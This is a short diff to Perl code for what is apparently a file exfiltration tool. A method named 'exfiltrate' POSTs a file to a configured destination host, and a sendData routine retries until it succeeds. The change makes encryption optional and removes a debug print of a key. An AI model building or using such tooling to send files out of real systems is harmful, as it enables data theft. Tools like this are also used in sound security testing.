@@ -39,7 +39,7 @@ sub sendData {
         state   =>  $state
     };
 
-    $request->content($self->SUPER::encrypt(encode_json $hash));
+    $request->content($self->encryptionKey ? $self->SUPER::encrypt(encode_json $hash) : encode_json($hash));
 
     while (!$res || $res->code != 200) {
         $res = $userAgent->request($request);
@@ -53,9 +53,6 @@ sub exfiltrate {
     my $request = new HTTP::Request 'POST' => $self->dest;
     my $id = int(rand(100000)) + int(rand(100));
 
-    # $self->SUPER::initKey();
-
-    print $self->pkey;
     my $fileSize = $self->SUPER::load($file);
     my $progress = Term::ProgressBar->new ({count => $fileSize, name => "Sending $file", ETA=>'linear'});
 
